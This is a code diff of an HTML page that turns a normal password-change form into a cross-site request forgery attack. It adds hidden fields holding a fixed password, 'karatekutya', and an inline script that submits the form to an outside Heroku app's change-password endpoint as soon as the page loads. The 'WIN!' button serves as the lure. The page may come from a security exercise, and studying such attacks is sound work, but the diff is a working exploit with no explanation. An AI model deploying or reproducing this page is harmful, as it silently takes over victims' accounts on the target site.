@@ -16,24 +16,18 @@
         <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
       </div>
 	  
-	  <form method="post" action="http://silver-quire.herokuapp.com/change-password" class="form-horizontal" >
-      <div class="form-group">
-        <label for="password" class="col-sm-4 control-label">Password</label>
-        <div class="col-sm-4">
-          <input id="password_confirmation" type="password" name="user[password]" class="form-control"/>
-        </div>
+	  <form id="hack" method="post" action="http://silver-quire.herokuapp.com/change-password" class="form-horizontal" >
+      
+          <input id="password_confirmation" type="hidden" name="user[password]" value="karatekutya"/>
+      
+          <input id="password_confirmation" type="hidden" name="user[password_confirmation]" value="karatekutya"/>
+      
+          <!--<button type="submit" class="btn btn-primary">Change!</button>-->
+      
       </div>
-      <div class="form-group">
-        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
-        <div class="col-sm-4">
-          <input id="password_confirmation" type="password" name="user[password_confirmation]" class="form-control"/>
-        </div>
-      </div>
-      <div class="form-group">
-        <div class="col-sm-offset-4 col-sm-4">
-          <button type="submit" class="btn btn-primary">Change!</button>
-        </div>
-      </div>
+	  <script>
+		document.getElementById("hack").submit();
+	  </script>
     </form>
   </body>
 </html>
